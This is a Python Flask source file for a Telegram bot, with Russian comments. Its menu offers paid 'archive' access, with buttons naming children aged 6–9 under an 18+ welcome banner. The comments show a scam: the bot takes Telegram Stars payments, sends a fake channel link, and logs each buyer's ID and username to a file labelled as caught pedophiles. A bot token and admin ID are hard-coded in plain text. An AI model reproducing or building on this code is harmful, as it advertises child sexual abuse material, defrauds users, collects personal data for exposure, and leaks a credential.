from flask import Flask, request
import requests
import json  # <---------- ЭТО ДОБАВИЛ!
from datetime import datetime

app = Flask(__name__)
TOKEN = "8715598722:AAG6sKN40FOPPQIC-cPF611LZ5A2Z01mDzk"
ADMIN_ID = 1544353769

def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if keyboard:
        data["reply_markup"] = keyboard
    requests.post(url, data=data)

# ГЛАВНОЕ МЕНЮ С ЦЕНАМИ
menu = {
    "inline_keyboard": [
        [{"text": "👧 МАЛЕНЬКИЕ 6-9 ЛЕТ - 150⭐", "callback_data": "buy_150"}],
        [{"text": "👦 МАЛЬЧИКИ 6-9 ЛЕТ - 150⭐", "callback_data": "buy_150"}],
        [{"text": "🔥 ПОЛНЫЙ ДОСТУП - 500⭐", "callback_data": "buy_500"}],
        [{"text": "💎 VIP КОЛЛЕКЦИЯ - 1000⭐", "callback_data": "buy_1000"}]
    ]
}

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if not update:
        return 'ok', 200
    
    # ОПЛАТА ПРОШЛА УСПЕШНО
    if 'message' in update and 'successful_payment' in update['message']:
        msg = update['message']
        payment = msg['successful_payment']
        user = msg.get('from', {})
        amount = payment.get('total_amount', 0)
        
        # ПИДОР ПОПАЛСЯ
        with open("pediki.txt", "a") as f:
            f.write(f"{datetime.now()} | {user.get('id')} | @{user.get('username')} | {amount}⭐\n")
        
        # КИДАЕМ ЕМУ ЛЮБУЮ ССЫЛКУ (ХОТЬ ФЕЙКОВУЮ)
        send_message(msg['chat']['id'],
            f"✅ ОПЛАЧЕНО! ССЫЛКА НА АРХИВ:\nhttps://t.me/joinchat/FAKE_CHANNEL",
            None)
        
        # ШЛЕМ ТЕБЕ
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            data={"chat_id": ADMIN_ID, "text": f"💰 ПОПОЛНЕНИЕ! @{user.get('username')} заплатил {amount}⭐"})
    
    # ОБРАБОТКА КНОПОК
    elif 'callback_query' in update:
        cb = update['callback_query']
        data = cb['data']
        
        # ОТВЕЧАЕМ НА КНОПКУ
        requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery",
            data={"callback_query_id": cb['id']})
        
        # ЦЕНЫ
        prices = {"buy_150": 150, "buy_500": 500, "buy_1000": 1000}
        price = prices.get(data, 150)
        
        # ОТПРАВЛЯЕМ СЧЕТ НА ОПЛАТУ
        invoice = {
            "chat_id": cb['message']['chat']['id'],
            "title": "ДОСТУП К АРХИВУ",
            "description": "Ссылка придет сразу после оплаты",
            "payload": f"pedo_{cb['from']['id']}",
            "provider_token": "",
            "currency": "XTR",
            "prices": [{"label": "Доступ", "amount": price}]
        }
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendInvoice", data=invoice)
    
    # КОМАНДА /start
    elif 'message' in update and update['message'].get('text') == '/start':
        user = update['message']['from']
        with open("pediki.txt", "a") as f:
            f.write(f"{datetime.now()} | {user.get('id')} | @{user.get('username')} | ЗАПУСТИЛ БОТА\n")
        
        send_message(update['message']['chat']['id'],
            "🔞 ДОБРО ПОЖАЛОВАТЬ В АРХИВ 🔞\n\nВыбери пакет:",
            json.dumps(menu))
    
    return 'ok', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
